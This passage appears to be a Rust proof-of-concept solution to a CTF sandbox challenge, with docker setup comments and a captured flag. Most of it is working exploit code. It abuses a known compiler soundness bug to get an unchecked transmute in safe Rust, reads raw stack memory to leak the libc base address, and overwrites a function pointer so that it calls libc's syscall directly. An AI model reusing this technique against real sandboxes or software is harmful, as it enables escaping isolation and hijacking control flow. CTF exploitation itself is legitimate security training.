"Triggering PoC..."));
poc();
}

// ==== LOCAL SETUP GUIDE ====
// cd custom_src
// docker build -t sandstone .
// cd ..
// docker run --rm -it -v HOST_PATH_TO/poc.rs:/poc.rs --security-opt seccomp:unconfined sandstone:latest

// CTF{InT3ndEd_8yP45_w45_g1tHu8_c0m_Ru5t_l4Ng_Ru5t_1ssue5_31287}
// See https://github.com/rust-lang/rust/issues/57893
trait Object<U> {
    type Output;
}

impl<T: ?Sized, U> Object<U> for T {
    type Output = U;
}

fn foo<T: ?Sized, U>(x: <T as Object<U>>::Output) -> U {
    x
}

fn transmute<T, U>(x: T) -> U {
    foo::<dyn Object<U, Output = T>, U>(x)
}

const PTR_SIZE: usize = std::mem::size_of::<usize>();

fn read_val(addr: usize) -> usize {
    *transmute::<*mut usize, &mut usize>(addr as *mut usize)
}

fn find_index(base_ptr: usize) -> usize {
    let pattern = [0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1];
    let mut start_index = 0;
    loop {
        let start_ptr = base_ptr + PTR_SIZE * start_index;
        if (0..pattern.len()).into_iter().all(|index| {
            let val = read_val(start_ptr + PTR_SIZE * index);
            if pattern[index] == 0 {
                val == 0
            } else {
                val > 0
            }
        }) {
            let target_index = start_index + 11;
            let target_ptr = base_ptr + PTR_SIZE * target_index;
            println!("{:03} 0x{:016x} - {:016x}", target_index, target_ptr, read_val(target_ptr));
            return target_index;
        }
        start_index += 1;
    }
}

fn fake_syscall(arg: usize) {
}

fn update(ptr: &mut fn(usize), val: usize) {
    let ptr_ref = transmute::<_, &mut usize>(ptr);
    *ptr_ref = val;
}

fn poc() {
    let stack = 0xabcdef0123456789usize;
    let mut ptr = (&stack as *const usize) as usize;
    println!("Current stack pointer: 0x{:016x}", ptr);

    let count = 200;

    ptr -= PTR_SIZE * count;
    let base_ptr = ptr;

    for i in 0..count {
        println!("{:03} 0x{:016x} - {:016x}", i, ptr, read_val(ptr));
        ptr += PTR_SIZE;
    }

    let lib_target_index = find_index(base_ptr);
    let lib_base = read_val(base_ptr + PTR_SIZE * lib_target_index) - 0x151e0;
    println!("lib{} base addr: 0x{:016x}", 'c', lib_base);

    let syscall_addr = lib_base + 0x1172d0;
    println!("lib{} syscall addr: 0x{:016x}", 'c', syscall_addr);

    let mut syscall_ptr: fn(usize) = fake_syscall;
    update(&mut syscall_ptr, syscall_addr);
    syscall_ptr(0x1337);

    println!("Please give me the flag");
    loop {
    }
}

fn unused() {
((
EOF
